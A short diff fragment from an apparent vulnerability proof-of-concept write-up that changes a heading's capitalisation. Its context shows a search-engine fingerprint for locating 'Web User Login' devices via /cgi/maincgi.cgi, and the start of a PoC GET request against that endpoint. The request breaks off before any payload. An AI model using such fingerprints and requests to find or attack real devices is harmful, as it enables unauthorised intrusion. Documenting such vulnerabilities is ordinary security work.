@@ -5,7 +5,7 @@
 title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
 ```
 
-## poc
+## POC
 ```
 GET /cgi/maincgi.cgi?Url=check HTTP/1.1
 Host:
